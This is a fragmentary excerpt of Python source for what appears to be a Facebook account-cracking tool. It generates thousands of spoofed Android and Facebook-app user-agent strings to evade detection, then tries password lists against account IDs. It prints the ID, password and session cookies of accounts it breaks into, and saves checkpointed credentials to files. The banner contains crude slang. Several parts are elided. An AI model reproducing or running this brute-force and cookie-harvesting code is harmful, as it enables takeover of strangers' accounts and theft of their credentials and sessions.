...
from requests import get as Piscok
...
for xiaominok in range(10000):
	...
	hemker_piscok = random.choice([pk_hemker,pk_hemker])
...
for samsz in range(10000):
	...
	buildz=random.choice(['N9F27M',
            ...
            'SP1A',
            'RKQ1'])
	samsung=random.choice(['S20 Ultra'])
	pk_hemker=f'Mozilla/5.0 (Linux; Android {version}; {samsung} Build/{buildz}.{ganz}.0{gue}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.{ganteng}.{kaya} Mobile Safari/537.36'
	pk_hemker2=f'Mozilla/5.0 (Linux; Android {version}; {samsung} Build/{buildz}.{ganz}.0{gue}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.{ganteng}.{kaya} Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/{lemin}.0.0.15.{hoho};]'
	hemker_piscok = random.choice([pk_hemker,pk_hemker2])
	piscok.append(hemker_piscok)
try:
...
def banner():
	clear()
	print(f'''{H}╔════════════════════════════════════════════════════════╗
{H}║{P}[{H}•{P}] Author    :{warna} Meee Kentod Pro                           {N}{H}║
{H}║{P}[{H}•{P}] Facebook  : {H}🤨 Hemker piscokkkk 🤨            {N}{H}║
{H}║{P}[{H}•{P}] Github    : {warna}github.com/shinoby10 {N}                   {H}║
{H}║{P}[{H}•{P}] Version   : {M}9.9.9 {P}Private                           {H}║ 
{H}║{P}[{H}•{P}] Tools     : {H}IJO KONTOL {K}KUNING MMK{H}                    ║
{H}╚════════════════════════════════════════════════════════╝ {P}''');print(led)
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
	...
	for pw in shinoby_pass:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[bold yellow]{idf}|{pw} ✓ [bold white]{tahun_akun(idf)}").add(f"[purple]{ua}")
				cetak(tree)
				...
				tree = Tree(f" ")
				tree.add(f"[bold green]{idf}|{pw} ✓ [bold white]{tahun_akun(idf)}").add(f"[bold green]{kuki}").add(f"[purple]{ua}")
				cetak(tree)
...
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					free = ShinobyOK(f" ")
					free.add(f"[bold yellow]{idf}|{pw} ✓ [bold white]{tahun_akun(idf)}").add(f"[purple]{ua}")
					cetak(free)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
					...
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					free = ShinobyOK(f" ")
					free.add(f"[bold green]{idf}|{pw} ✓ [bold white]{tahun_akun(idf)}").add(f"[bold green]{kuki}").add(f"[purple]{ua}")
					cetak(free)
